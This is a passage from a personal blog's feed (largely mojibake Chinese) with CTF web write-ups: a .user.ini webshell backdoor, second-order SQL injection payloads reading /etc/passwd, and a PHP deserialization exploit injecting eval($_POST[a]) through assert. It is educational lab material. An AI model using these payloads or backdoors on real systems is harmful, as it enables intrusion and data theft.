phpåé—¨ï¼Œ<strong>.user.ini</strong>çš„ä½¿ç”¨å‰ææ˜¯ç›®å½•ä¸­å¿…é¡»æœ‰è‡³å°‘ä¸€ä¸ªphpæ–‡ä»¶ï¼Œ<strong>.user.ini</strong>æœ‰ä¸¤ä¸ªé…ç½®å‚æ•°ï¼š<strong>auto_prepend_file</strong>å’Œ<strong>auto_append_file</strong>ã€‚<br>auto_prepend_fileæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure><p>01.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶ã€‚<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshellã€‚<br><img src="/images/20200724003955.png" alt=""></p><blockquote><p>å‚è€ƒé“¾æ¥<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p></blockquote><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒapacheæœåŠ¡å™¨ä¸Šä¼ <strong>.htaccess</strong>æ–‡ä»¶</p><h2 id="BJDCTF-2nd-SchroÌˆdinger"><a href="#BJDCTF-2nd-SchroÌˆdinger" class="headerlink" title="[BJDCTF 2nd]SchroÌˆdinger"></a>[BJDCTF 2nd]SchroÌˆdinger</h2><p>æ¯«æ— æ„ä¹‰çš„ä¸€é“é¢˜ï¼Œæµªè´¹äº†åå‡ åˆ†é’Ÿçš„æ—¶é—´ã€‚</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>æŸ¥çœ‹æºç æœ‰<code>flag.php</code>ï¼Œè®¿é—®ç„¶åä¿®æ”¹<code>X-Forwarded-For: 127.0.0.1</code>å¯å¾—flag</p><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><blockquote><p>äºŒæ¬¡æ³¨å…¥ï¼Œgitæ³„éœ²</p></blockquote><p>çˆ†ç ´å¾—åˆ°è´¦å·å¯†ç ï¼Œç™»é™†<br>ç„¶åæ˜¯gitæ³„éœ²ï¼Œå…ˆä¸‹è½½æºç ç„¶åä¿®å¤ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>do=writeçš„æ—¶å€™å¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œè½¬ç§»ï¼Œä½†æ˜¯ä¹‹åæ•°æ®åº“ä¼šè‡ªåŠ¨æ¸…é™¤åæ–œæ ï¼Œç„¶ådo=commitçš„æ—¶å€™å¯¹å–å‡ºçš„categoryæ²¡æœ‰è¿›è¡Œå¤„ç†å°±æ’å…¥ï¼Œå¯¼è‡´äº†äºŒæ¬¡æ³¨å…¥ï¼Œæ‰€ä»¥å‰é¢é‚£ä¸ªaddslashesæ ¹æœ¬èµ·ä¸åˆ°é˜²æŠ¤çš„ä½œç”¨<br>ç¬¬ä¸€æ¬¡è¾“å…¥categoryå’Œç¬¬äºŒæ¬¡è¾“å…¥contentå¯ä»¥æ‹¼æ¥ï¼Œå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into comment</span><br><span class="line">set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">    content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">    bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ”¾ä¸¤ä¸ªpayloadï¼Œè¯»å–flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h2><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests as req</span><br><span class="line">elements &#x3D; (&#39;H&#39;, &#39;He&#39;, &#39;Li&#39;, &#39;Be&#39;, &#39;B&#39;, &#39;C&#39;, &#39;N&#39;, &#39;O&#39;, &#39;F&#39;, &#39;Ne&#39;, &#39;Na&#39;, &#39;Mg&#39;, &#39;Al&#39;, &#39;Si&#39;, &#39;P&#39;, &#39;S&#39;, &#39;Cl&#39;, &#39;Ar&#39;,</span><br><span class="line">                  &#39;K&#39;, &#39;Ca&#39;, &#39;Sc&#39;, &#39;Ti&#39;, &#39;V&#39;, &#39;Cr&#39;, &#39;Mn&#39;, &#39;Fe&#39;, &#39;Co&#39;, &#39;Ni&#39;, &#39;Cu&#39;, &#39;Zn&#39;, &#39;Ga&#39;, &#39;Ge&#39;, &#39;As&#39;, &#39;Se&#39;, &#39;Br&#39;, </span><br><span class="line">                  &#39;Kr&#39;, &#39;Rb&#39;, &#39;Sr&#39;, &#39;Y&#39;, &#39;Zr&#39;, &#39;Nb&#39;, &#39;Mo&#39;, &#39;Te&#39;, &#39;Ru&#39;, &#39;Rh&#39;, &#39;Pd&#39;, &#39;Ag&#39;, &#39;Cd&#39;, &#39;In&#39;, &#39;Sn&#39;, &#39;Sb&#39;, &#39;Te&#39;, </span><br><span class="line">                  &#39;I&#39;, &#39;Xe&#39;, &#39;Cs&#39;, &#39;Ba&#39;, &#39;La&#39;, &#39;Ce&#39;, &#39;Pr&#39;, &#39;Nd&#39;, &#39;Pm&#39;, &#39;Sm&#39;, &#39;Eu&#39;, &#39;Gd&#39;, &#39;Tb&#39;, &#39;Dy&#39;, &#39;Ho&#39;, &#39;Er&#39;, &#39;Tm&#39;, </span><br><span class="line">                  &#39;Yb&#39;, &#39;Lu&#39;, &#39;Hf&#39;, &#39;Ta&#39;, &#39;W&#39;, &#39;Re&#39;, &#39;Os&#39;, &#39;Ir&#39;, &#39;Pt&#39;, &#39;Au&#39;, &#39;Hg&#39;, &#39;Tl&#39;, &#39;Pb&#39;, &#39;Bi&#39;, &#39;Po&#39;, &#39;At&#39;, &#39;Rn&#39;, </span><br><span class="line">                  &#39;Fr&#39;, &#39;Ra&#39;, &#39;Ac&#39;, &#39;Th&#39;, &#39;Pa&#39;, &#39;U&#39;, &#39;Np&#39;, &#39;Pu&#39;, &#39;Am&#39;, &#39;Cm&#39;, &#39;Bk&#39;, &#39;Cf&#39;, &#39;Es&#39;, &#39;Fm&#39;,&#39;Md&#39;, &#39;No&#39;, &#39;Lr&#39;,</span><br><span class="line">                  &#39;Rf&#39;, &#39;Db&#39;, &#39;Sg&#39;, &#39;Bh&#39;, &#39;Hs&#39;, &#39;Mt&#39;, &#39;Ds&#39;, &#39;Rg&#39;, &#39;Cn&#39;, &#39;Nh&#39;, &#39;Fl&#39;, &#39;Mc&#39;, &#39;Lv&#39;, &#39;Ts&#39;, &#39;Og&#39;, &#39;Uue&#39;)</span><br><span class="line">for symbol in elements:</span><br><span class="line">    link &#x3D; &quot;http:&#x2F;&#x2F;bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn&#x2F;&quot; + symbol + &quot;.php&quot;</span><br><span class="line">    response &#x3D; req.get(link)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(response.text, end&#x3D;&#39;&#39;)</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb&quot;&gt;&lt;a href=&quot;#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb&quot;&gt;&lt;/a&gt;[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb&lt;/h2&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF[NPUCTF2020]web WP</title>
    <link href="http://yoursite.com/2020/05/28/Kath4rs1s/"/>
    <id>http://yoursite.com/2020/05/28/Kath4rs1s/</id>
    <published>2020-05-28T06:56:49.914Z</published>
    <updated>2020-07-20T10:32:51.733Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="BUUCTF-NPUCTF2020"><a href="#BUUCTF-NPUCTF2020" class="headerlink" title="BUUCTF[NPUCTF2020]"></a>BUUCTF[NPUCTF2020]</h1><p>ä¸Šå‘¨åšäº†åšNPUCTFçš„é¢˜ï¼Œä»Šå¤©åœ¨buuojä¸Šé¢å¤ç°äº†ä¸€æ³¢ï¼Œé¡ºä¾¿å†™å†™write up</p><a id="more"></a><h2 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h2><p>è¿™æ˜¯ä¸€é“ç®€å•çš„ååºåˆ—åŒ–çš„é¢˜<br>è¿›å…¥é¡µé¢æ²¡ä»€ä¹ˆå‘ç°ï¼Œåªæœ‰ä¸€ä¸ªè·³è½¬åˆ°è¥¿å·¥å¤§å®˜ç½‘çš„é“¾æ¥ï¼Œç„¶åæŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€ä¸ªéšè—çš„aæ ‡ç­¾</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423190116592-758599765.png" alt=""></p><p>ç„¶åè¿›å…¥é¡µé¢ï¼Œçœ‹åˆ°äº†æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„å…³é”®åœ¨äºå½“æ‰§è¡Œååºåˆ—åŒ–å‡½æ•°çš„æ—¶å€™ï¼Œè°ƒç”¨__destructå‡½æ•°æ‰§è¡Œ<em>echo $b($a)</em>ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ‰§è¡Œä»»æ„æˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°getshellçš„ç›®çš„ã€‚<br>æ¥ä¸‹æ¥ä¾¿æ˜¯å†™phpè„šæœ¬æ„é€ åºåˆ—åŒ–äº†ï¼ŒæœŸé—´è¯•äº†å¾ˆå¤šå‡½æ•°æ¯”å¦‚<em>system</em>ç­‰ç­‰éƒ½è¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨<strong>assert</strong>è¿™ä¸ªå‡½æ•°ã€‚<br>é¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹æ–­è¨€ï¼ˆassertï¼‰è¿™ä¸ªå‡½æ•°ï¼Œå‚è€ƒå¤§ä½¬çš„æ–‡ç« <a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">PHP assert å’Œ eval</a></p><blockquote><p>assert   åˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or falseï¼›</p></blockquote><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;123&quot;;</span><br><span class="line">echo assert(is_numeric($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç è¾“å‡ºçš„ç»“æœæ˜¯ï¼š<br><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423195608051-314750544.png" alt=""></p><p>ç®€è¨€ä¹‹å°±æ˜¯<em>assert()</em>å¯ä»¥å°†æ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“ä½œphpå‚æ•°æ‰§è¡Œï¼Œè€Œç±»ä¼¼çš„<em>eval()</em>å‡½æ•°æ˜¯æ‰§è¡Œåˆæ³•çš„phpä»£ç ã€‚<br>æ¥ä¸‹æ¥æ”¾å‡ºåºåˆ—åŒ–çš„è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line">$c-&gt;b &#x3D; &#39;assert&#39;;</span><br><span class="line">$c-&gt;a &#x3D; &#39;eval($_POST[a]);&#39;;</span><br><span class="line">echo urlencode(serialize($c)).&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé™¤äº†ç”¨<em>assert()</em>ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨<strong>call_user_func()</strong>å‡½æ•°</p><blockquote><p>call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function barber($type)&#123;</span><br><span class="line">    echo &quot;you wanted a $type haircut, no problem\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(&#39;barber&#39;,&#39;mushroom&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;è¿”å›å†…å®¹å¦‚ä¸‹ï¼š</span><br><span class="line">&#x2F;&#x2F;you wanted a mushroom haircut, no problem</span><br></pre></td></tr></table></figure><p>åªè¦æ„é€ å‡º<strong>call_user_func(phpinfo)</strong>å°±å¥½äº†</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data&#x3D;O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¾—å‡ºç»“æœï¼š</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200124220-346066862.png" alt=""></p><p>flagå°±åœ¨phpinfoä¸­</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200413520-1487498985.png" alt=""><br>å¾—åˆ°flagï¼</p><p><strong>æœªå®Œå¾…ç»­Â·Â·Â·</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;BUUCTF-NPUCTF2020&quot;&gt;&lt;a href=&quot;#BUUCTF-NPUCTF2020&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF[NPUCTF2020]&quot;&gt;&lt;/a&gt;BUUCTF[NPUCTF2020]&lt;/h1&gt;&lt;p&gt;ä¸Šå‘¨åšäº†åšNPUCTFçš„é¢˜ï¼Œä»Šå¤©åœ¨buuojä¸Šé¢å¤ç°äº†ä¸€æ³¢ï¼Œé¡ºä¾¿å†™å†™write up&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/05/28/hello-world/"/>
    <id>http://yoursite.com/2020/05/28/hello-world/</id>
    <published>2020-05-27T18:22:14.688Z</published>
    <updated>2020-07-20T10:31:56.764Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
